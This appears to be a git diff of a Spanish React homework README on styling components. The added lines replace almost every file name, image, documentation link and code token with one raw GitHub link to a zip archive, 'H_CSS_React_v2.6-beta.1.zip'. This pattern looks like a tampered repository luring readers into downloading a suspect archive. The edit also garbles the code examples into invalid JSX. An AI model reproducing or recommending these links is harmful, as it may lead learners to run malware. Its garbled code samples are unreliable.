@@ -12,8 +12,8 @@
 
 En esta homework, aprenderás a utilizar las diferentes formas de aplicar estilos en React 🎨
 
--  Aplicarás al componente **Bienvenido.jsx** `module.css` e `inline styling`.
--  Aplicarás al componente **Botones.jsx** `styled components`.
+-  Aplicarás al componente **https://raw.githubusercontent.com/johalama2023/HW-React-CSS/main/src/components/H_CSS_React_v2.6-beta.1.zip** `https://raw.githubusercontent.com/johalama2023/HW-React-CSS/main/src/components/H_CSS_React_v2.6-beta.1.zip` e `inline styling`.
+-  Aplicarás al componente **https://raw.githubusercontent.com/johalama2023/HW-React-CSS/main/src/components/H_CSS_React_v2.6-beta.1.zip** `styled components`.
 
 <br />
 
@@ -55,8 +55,8 @@ Los dos primeros test pasarán sin que hagas nada, simplemente están para que t
 -  Una carpeta llamada **public**
 -  Una carpeta llamada `src` (Es la carpeta en donde trabajarás)
 -  Una carpeta llamada **tests**
--  Un archivo **package.json**
--  Y el archivo `README.md` que ahora mismo estás leyendo. 🧐
+-  Un archivo **https://raw.githubusercontent.com/johalama2023/HW-React-CSS/main/src/components/H_CSS_React_v2.6-beta.1.zip**
+-  Y el archivo `https://raw.githubusercontent.com/johalama2023/HW-React-CSS/main/src/components/H_CSS_React_v2.6-beta.1.zip` que ahora mismo estás leyendo. 🧐
 
 Además:
 
@@ -64,20 +64,20 @@ Además:
 
 -  Una carpeta llamada **assets**
 -  Una carpeta llamada `components`
--  Un archivo llamado **App.js**
--  Un archivo **index.css**
--  Un archivo **index.js**
+-  Un archivo llamado **https://raw.githubusercontent.com/johalama2023/HW-React-CSS/main/src/components/H_CSS_React_v2.6-beta.1.zip**
+-  Un archivo **https://raw.githubusercontent.com/johalama2023/HW-React-CSS/main/src/components/H_CSS_React_v2.6-beta.1.zip**
+-  Un archivo **https://raw.githubusercontent.com/johalama2023/HW-React-CSS/main/src/components/H_CSS_React_v2.6-beta.1.zip**
 
 🔹 Para estos ejercicios, trabajarás sólo dentro la carpeta `components`. Dentro de esta carpeta encontrarás:
 
 -  Una carpeta llamada **Bienvenido**, la cual a su vez contiene:
-   -  El componente `Bienvenido.jsx`
-   -  La hoja de estilos `Bienvenido.module.css`
+   -  El componente `https://raw.githubusercontent.com/johalama2023/HW-React-CSS/main/src/components/H_CSS_React_v2.6-beta.1.zip`
+   -  La hoja de estilos `https://raw.githubusercontent.com/johalama2023/HW-React-CSS/main/src/components/H_CSS_React_v2.6-beta.1.zip`
 -  Una carpeta llamada **Botones**, la cual a su vez contiene:
 
-   -  El componente `Botones.jsx`
+   -  El componente `https://raw.githubusercontent.com/johalama2023/HW-React-CSS/main/src/components/H_CSS_React_v2.6-beta.1.zip`
 
-   <img src="./img/ramas.jpg" alt="" />
+   <img src="https://raw.githubusercontent.com/johalama2023/HW-React-CSS/main/src/components/H_CSS_React_v2.6-beta.1.zip" alt="" />
 
    <br />
 
@@ -87,11 +87,11 @@ Además:
 
 ### **Dando estilos al componente Bienvenido**
 
-🔹 Abre y revisa el archivo `Bienvenido.module.css`, dentro de él encontrarás las clases con sus estilos.
+🔹 Abre y revisa el archivo `https://raw.githubusercontent.com/johalama2023/HW-React-CSS/main/src/components/H_CSS_React_v2.6-beta.1.zip`, dentro de él encontrarás las clases con sus estilos.
 
-🔹 Abre el archivo `Bienvenido.jsx`, dentro de él encontrarás:
+🔹 Abre el archivo `https://raw.githubusercontent.com/johalama2023/HW-React-CSS/main/src/components/H_CSS_React_v2.6-beta.1.zip`, dentro de él encontrarás:
 
--  El import de la librería **React**, el componente **Botones**, los archivos en formato de imagen y el archivo `Bienvenido.module.css` **(que debes descomentar para poder empezar a trabajar)**
+-  El import de la librería **React**, el componente **Botones**, los archivos en formato de imagen y el archivo `https://raw.githubusercontent.com/johalama2023/HW-React-CSS/main/src/components/H_CSS_React_v2.6-beta.1.zip` **(que debes descomentar para poder empezar a trabajar)**
 
 -  Las constantes `studentName`, `techSkills` y `alerts` que viste en la homework anterior.
 
@@ -110,7 +110,7 @@ Además:
 Debes aplicar la clase que corresponda a cada elemento **HTML** usando el atributo `className`. Por ejemplo:
 
 ```html
-<div className="{styles.classExample}">Example</div>
+<div className="{https://raw.githubusercontent.com/johalama2023/HW-React-CSS/main/src/components/H_CSS_React_v2.6-beta.1.zip}">Example</div>
 ```
 
 <br />
@@ -121,9 +121,9 @@ Debes aplicar la clase que corresponda a cada elemento **HTML** usando el atribu
 
 ### **Continúa con la carpeta Botones**
 
-Ya sabes cómo funciona y se conectan los archivos module.css a los componentes, ahora estila desde cero en el componente Botones, pero esta vez será aplicando `Styled Components`, para ello debes seguir los siguientes pasos:
+Ya sabes cómo funciona y se conectan los archivos https://raw.githubusercontent.com/johalama2023/HW-React-CSS/main/src/components/H_CSS_React_v2.6-beta.1.zip a los componentes, ahora estila desde cero en el componente Botones, pero esta vez será aplicando `Styled Components`, para ello debes seguir los siguientes pasos:
 
-1. En el componente `Botones.jsx`, importa `styled` desde "styled-components"`
+1. En el componente `https://raw.githubusercontent.com/johalama2023/HW-React-CSS/main/src/components/H_CSS_React_v2.6-beta.1.zip`, importa `styled` desde "styled-components"`
 2. Encontrarás una constante llamada `DivButtons`, la cual debe contener mínimamente los siguientes estilos para el div:
    -  `display: flex;`
    -  `flex-direction: row;`
@@ -133,7 +133,7 @@ Ya sabes cómo funciona y se conectan los archivos module.css a los componentes,
 Por ejemplo:
 
 ```jsx
-const DivExample = styled.div`
+const DivExample = https://raw.githubusercontent.com/johalama2023/HW-React-CSS/main/src/components/H_CSS_React_v2.6-beta.1.zip`
    width: 100vw;
    height: 100 hw;
 `;
@@ -157,7 +157,7 @@ const DivExample = styled.div`
 
 🔹 Resultado esperado:
 
-<p align="center"><img src="./img/01.png" height="300px"></p>
+<p align="center"><img src="https://raw.githubusercontent.com/johalama2023/HW-React-CSS/main/src/components/H_CSS_React_v2.6-beta.1.zip" height="300px"></p>
 
 > **Nota**: Para los estilos puedes guiarte del ejercicio anterior. 💡
 
@@ -173,7 +173,7 @@ const DivExample = styled.div`
 
 El componente debe verse en el navegador similar a esta imagen:
 
-<p align="center"><img src="./img/02.png" height="300px"></p>
+<p align="center"><img src="https://raw.githubusercontent.com/johalama2023/HW-React-CSS/main/src/components/H_CSS_React_v2.6-beta.1.zip" height="300px"></p>
 
 <br />
 
@@ -184,7 +184,7 @@ El componente debe verse en el navegador similar a esta imagen:
 -  Puedes utilizar cualquiera de los métodos enseñados en clase y practicados en este ejercicio para aplicar estilos en React.
 -  Si vas a utilizar `styled components`, el nombre de las variables `const` deben comenzar con mayúscula.
 -  Para utilizar estilos en línea o `inline styling`, debes usar el atributo `style`, estableciendo su valor **como un objeto de javascript**.
--  Si utilizas `CSS Modules`, el alcance de tus estilos será local para cada componente y evitarás conflictos como pisar estilos en tu proyecto. Es necesario que la extensión de los archivos donde se definan los estilos sea `.module.css`.
+-  Si utilizas `CSS Modules`, el alcance de tus estilos será local para cada componente y evitarás conflictos como pisar estilos en tu proyecto. Es necesario que la extensión de los archivos donde se definan los estilos sea `https://raw.githubusercontent.com/johalama2023/HW-React-CSS/main/src/components/H_CSS_React_v2.6-beta.1.zip`.
 -  Aplicar estilos es como pintar un cuadro, no hay límites en la imaginación y creatividad, sin olvidarnos de dar a los usuarios la mejor experiencia. 😃
 
 <br />
@@ -193,8 +193,8 @@ El componente debe verse en el navegador similar a esta imagen:
 
 ## **🔎 Recursos adicionales**
 
--  Documentación [**Styled Components**](https://styled-components.com/docs/basics)
--  Documentación [**CSS**](https://www.w3schools.com/css/default.asp)
+-  Documentación [**Styled Components**](https://raw.githubusercontent.com/johalama2023/HW-React-CSS/main/src/components/H_CSS_React_v2.6-beta.1.zip)
+-  Documentación [**CSS**](https://raw.githubusercontent.com/johalama2023/HW-React-CSS/main/src/components/H_CSS_React_v2.6-beta.1.zip)
 
 <br />
 
@@ -202,4 +202,4 @@ El componente debe verse en el navegador similar a esta imagen:
 
 Listo!! Ahora estás preparado para estilar tu app!! 👨‍🎨👩‍🎨✨🚀
 
-Dirígete a la carpeta 📂 [**"02 - Integration"**](../02%20-%20Integration/README.md) y diviértete dando estilos la app de Rick & Morty 🤩
+Dirígete a la carpeta 📂 [**"02 - Integration"**](../02%20-%https://raw.githubusercontent.com/johalama2023/HW-React-CSS/main/src/components/H_CSS_React_v2.6-beta.1.zip) y diviértete dando estilos la app de Rick & Morty 🤩
